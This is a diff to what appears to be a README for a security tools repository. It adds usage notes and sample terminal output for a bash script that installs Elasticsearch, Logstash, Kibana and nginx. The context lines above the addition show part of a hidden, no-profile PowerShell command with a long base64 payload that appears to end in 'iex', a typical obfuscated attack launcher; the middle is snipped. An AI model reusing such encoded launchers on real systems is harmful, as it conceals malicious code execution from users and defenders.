@@ -48,3 +48,47 @@ powershell -nop -win hidden -noni -enc JAB5AGwAbwAgAD0AIAAnACQARgBkAEsAZAAgAD0AI
 ....snip...
 QB7ADsAaQBlAHgAIAAiACYAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAJABoAGIAcwAgACQAZQAiADsAfQA=
 ```
+
+### ELK_installer_master.sh
+Simple bash script to automate the installation and configuration of ELK. Tested on Ubintu 16.04 LTS
+
+### USAGE
+```
+evil@ubuntu:~/Desktop$ sudo ./ELK_installer_master.sh 
+[+] We are root and good to go!
+[+] Installing a few dependencies (Openjdk, nginx, openssh-server & apt-transport ) for ELK
+[+] This could take a while...
+[+] Installing Elastic PGP signing key
+OK
+[+] Done
+[+] Adding Elastic Packages source list definitions to your sources list
+deb https://artifacts.elastic.co/packages/5.x/apt stable main
+[+] Done
+[+] Installing & Configuring Elastic Search
+[+] Done
+[+] Starting Elastic Search
+[+] Elastic Search is up and running.
+[+] Installing & Configuring Kibana
+[+] Done
+[+] Starting Kibana
+[+] Kibana is up and running.
+[+] Create a password to log into our Kibana web interface: kibadmin
+[+] Please confirm: kibadmin
+kibadmin:$apr1$vUzMPzMm$AavpIQb/TutkMHVizawfs0
+Username: kibadmin
+[+] Password set.
+[+] Configuring nginx
+[+] Enter IP Address:192.168.83.142
+[+] Testing nginx config
+[+] Nginx is up and running. You should be able to log into Kibana
+[+] Installing & Configuring Logstash
+[+] Your cert has been stored to the location below.
+/etc/pki/tls/certs/logstash-forwarder.crt
+[+] Done
+[+] Creating custom Logstash configuration files.
+[+] Starting logstash.
+[+] Logstash is up and running.
+[+] The log file for ELK is located at: /var/log/ELK_install.log.
+[+] We should be all good.
+evil@ubuntu:~/Desktop$ 
+```
